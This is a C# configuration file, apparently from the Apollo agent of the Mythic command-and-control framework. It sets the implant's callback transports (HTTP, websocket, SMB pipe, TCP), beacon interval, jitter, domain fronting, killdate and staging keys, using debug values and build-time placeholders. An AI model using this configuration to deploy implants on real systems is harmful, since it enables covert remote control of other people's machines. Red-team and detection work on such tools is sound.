#define C2PROFILE_NAME_UPPER

#if DEBUG
#define WEBSOCKET
#endif

#if HTTP
using HttpTransport;
#endif
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using ApolloInterop.Structs.ApolloStructs;
using PSKCryptography;
using ApolloInterop.Serializers;
#if WEBSOCKET
using WebsocketTransport;
#endif
#if SMB
using NamedPipeTransport;
#endif
#if TCP
using TcpTransport;
#endif
namespace Apollo
{
    public static class Config
    {
        public static Dictionary<string, C2ProfileData> EgressProfiles = new Dictionary<string, C2ProfileData>()
        {
#if HTTP
            { "http", new C2ProfileData()
                {
                    TC2Profile = typeof(HttpProfile),
                    TCryptography = typeof(PSKCryptographyProvider),
                    TSerializer = typeof(EncryptedJsonSerializer),
                    Parameters = new Dictionary<string, string>()
                    {
#if DEBUG
                        { "callback_interval", "5" },
                        { "callback_jitter", "0" },
                        { "callback_port", "80" },
                        { "callback_host", "http://mythic" },
                        { "post_uri", "data" },
                        { "encrypted_exchange_check", "T" },
                        { "proxy_host", "" },
                        { "proxy_port", "" },
                        { "proxy_user", "" },
                        { "proxy_pass", "" },
                        { "domain_front", "domain_front" },
                        { "killdate", "-1" },
                        { "USER_AGENT", "Apollo-Refactor" },
#else
                        { "callback_interval", "callback_interval_here" },
                        { "callback_jitter", "callback_jitter_here" },
                        { "callback_port", "callback_port_here" },
                        { "callback_host", "callback_host_here" },
                        { "post_uri", "post_uri_here" },
                        { "encrypted_exchange_check", "encrypted_exchange_check_here" },
                        { "proxy_host", "proxy_host_here" },
                        { "proxy_port", "proxy_port_here" },
                        { "proxy_user", "proxy_user_here" },
                        { "proxy_pass", "proxy_pass_here" },
                        { "killdate", "killdate_here" },
                        HTTP_ADDITIONAL_HEADERS_HERE
#endif
                    }
                }
            },
#endif
#if WEBSOCKET
            { "websocket", new C2ProfileData()
                {
                    TC2Profile = typeof(WebsocketProfile),
                    TCryptography = typeof(PSKCryptographyProvider),
                    TSerializer = typeof(EncryptedJsonSerializer),
                    Parameters = new Dictionary<string, string>()
                    {
#if DEBUG
                        { "tasking_type", "Push" },
                        { "callback_interval", "5" },
                        { "callback_jitter", "0" },
                        { "callback_port", "8081" },
                        { "callback_host", "ws://mythic" },
                        { "ENDPOINT_REPLACE", "socket" },
                        { "encrypted_exchange_check", "T" },
                        { "domain_front", "domain_front" },
                        { "killdate", "-1" },
                        { "USER_AGENT", "Apollo-Refactor" },
#else
                        { "callback_interval", "callback_interval_here" },
                        { "callback_jitter", "callback_jitter_here" },
                        { "callback_port", "callback_port_here" },
                        { "callback_host", "callback_host_here" },
                        { "post_uri", "post_uri_here" },
                        { "encrypted_exchange_check", "encrypted_exchange_check_here" },
                        { "proxy_host", "proxy_host_here" },
                        { "proxy_port", "proxy_port_here" },
                        { "proxy_user", "proxy_user_here" },
                        { "proxy_pass", "proxy_pass_here" },
                        { "killdate", "killdate_here" },
                        HTTP_ADDITIONAL_HEADERS_HERE
#endif
                    }
                }
            },
#endif
#if SMB
            { "smb", new C2ProfileData()
                {
                    TC2Profile = typeof(NamedPipeProfile),
                    TCryptography = typeof(PSKCryptographyProvider),
                    TSerializer = typeof(EncryptedJsonSerializer),
                    Parameters = new Dictionary<string, string>()
                    {
#if DEBUG
                        { "pipename", "ahatojqq-bo0w-oc3r-wqtg-4jf7voepqqbs" },
                        { "encrypted_exchange_check", "T" },
#else
                        { "pipename", "pipename_here" },
                        { "encrypted_exchange_check", "encrypted_exchange_check_here" },
#endif
                    }
                }
            },
#elif TCP
            { "tcp", new C2ProfileData()
                {
                    TC2Profile = typeof(TcpProfile),
                    TCryptography = typeof(PSKCryptographyProvider),
                    TSerializer = typeof(EncryptedJsonSerializer),
                    Parameters = new Dictionary<string, string>()
                    {
#if DEBUG
                        { "port", "40000" },
                        { "encrypted_exchange_check", "T" },
#else
                        { "port", "port_here" },
                        { "encrypted_exchange_check", "encrypted_exchange_check_here" },
#endif
                    }
                }
            }
#endif
        };


        public static Dictionary<string, C2ProfileData> IngressProfiles = new Dictionary<string, C2ProfileData>();
#if DEBUG
#if HTTP
        public static string StagingRSAPrivateKey = "wO+CTvxcnsOclJ18n4rBilEc9NlhirkiITjwlWDaPRI=";
#elif WEBSOCKET
        public static string StagingRSAPrivateKey = "TYSeN+dDzfg+pJoziRsxgMQrkmura3cGAB84Jwyv4xY="; // yes encryption and yes keyx
        //public static string StagingRSAPrivateKey = "5cuJwKmb46fpuN5LKjqSG9hi8LX7YVa1oTsq4pyO9co="; // yes encryption and no keyx
        //public static string StagingRSAPrivateKey = "guyLutje7rMlKDsp2FXfNSiCagEUL8FXxJhsgdHsLWU="; // yes encrypt and yes keyx and Poll
#elif SMB
        public static string StagingRSAPrivateKey = "cnaJ2eDg1LVrR5LK/u6PkXuBjZxCnksWjy0vEFWsHIU=";
#elif TCP
        public static string StagingRSAPrivateKey = "LbFpMoimB+aLx1pq0IqXJ1MQ4KIiGdp0LWju5jUhZRg=";
#endif
#if HTTP
        public static string PayloadUUID = "89d28526-e957-4142-b0fe-b672b397179f";
#elif WEBSOCKET
        public static string PayloadUUID = "f4d26e36-b6e6-4c3d-a82a-856750a7f681"; // yes encryption and yes keyx
        //public static string PayloadUUID = "b2c25db8-a2f5-41e2-84d8-e733afe02abd"; // yes encryption but no keyx
        //public static string PayloadUUID = "23597ba9-3519-4253-bf5b-f2c6f3c63945"; // yes encryption and yes keyx and Poll
#elif SMB
        public static string PayloadUUID = "869c4909-30eb-4a90-99b2-874dae07a0a8";
#elif TCP
        public static string PayloadUUID = "a51253f6-7885-4fea-9109-154ecc54060d";
#endif
#else
        public static string StagingRSAPrivateKey = "AESPSK_here";
        public static string PayloadUUID = "payload_uuid_here";
#endif
    }
}
